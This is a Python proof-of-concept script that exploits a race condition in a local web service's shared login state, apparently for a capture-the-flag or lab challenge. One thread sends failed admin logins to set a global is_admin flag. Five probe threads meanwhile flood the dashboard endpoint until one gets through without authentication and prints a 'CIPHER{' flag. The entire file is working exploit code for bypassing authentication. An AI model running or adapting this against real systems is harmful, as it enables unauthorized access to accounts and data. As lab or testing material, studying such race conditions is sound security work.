# poc/race_exploit.py
import threading
import requests
import time
import sys

# Configuration
TARGET_HOST = "http://127.0.0.1:8085"
TRIGGER_URL = f"{TARGET_HOST}/api/login"
PROBE_URL = f"{TARGET_HOST}/api/dashboard"

# Synchronization Flags
exploit_successful = False
stop_event = threading.Event()

def trigger_pollution():
    """
    The 'Distraction':
    Sends a login request as 'admin'. The server will process this for ~300ms.
    During that time, the global state is polluted with is_admin=True.
    """
    while not stop_event.is_set():
        try:
            # Junk password, we just want to trigger the processing delay
            requests.post(TRIGGER_URL, json={"username": "admin", "password": "invalid_password"}, timeout=1)
        except requests.exceptions.RequestException:
            pass
        # Small delay to allow the server to reset (pulsing the attack)
        time.sleep(0.5)

def probe_access(worker_id):
    """
    The 'Thief':
    Spams the dashboard. If it hits the server while the Trigger is sleeping,
    it will bypass authentication.
    """
    global exploit_successful
    while not stop_event.is_set():
        try:
            r = requests.get(PROBE_URL, timeout=1)
            
            # If we get a 200 OK, we successfully raced the condition
            if r.status_code == 200 and "CIPHER{" in r.text:
                print(f"\n[+] \033[92mRACE WON! (Probe {worker_id})\033[0m")
                print(f"    Payload: {r.json()}")
                exploit_successful = True
                stop_event.set()
                return
            
            # Optional: Print 403s to show the race attempts
            # if r.status_code == 403:
            #     print(f"[-] Probe {worker_id}: {r.json().get('error')}", end='\r')

        except requests.exceptions.RequestException:
            pass
        
        # Don't DoS the local socket
        time.sleep(0.01)

def run_exploit():
    print(f"[*] Cipher PoC: Singleton State Race against {TARGET_HOST}")
    
    # 1. Start the Probes (Runners)
    probes = []
    print("[*] Launching 5 Probe threads...")
    for i in range(5):
        t = threading.Thread(target=probe_access, args=(i,))
        t.daemon = True
        t.start()
        probes.append(t)
    
    # 2. Start the Trigger (Opens the window)
    print("[*] Launching Trigger thread (Polluting Global State)...")
    trigger = threading.Thread(target=trigger_pollution)
    trigger.daemon = True
    trigger.start()
    
    # 3. Wait for success
    start_time = time.time()
    try:
        while not exploit_successful and time.time() - start_time < 10:
            time.sleep(0.1)
    except KeyboardInterrupt:
        pass
    
    stop_event.set()
    trigger.join(timeout=1)
    
    if not exploit_successful:
        print("\n[-] Exploit failed. The window might be too small or timing is off.")

if __name__ == "__main__":
    run_exploit()
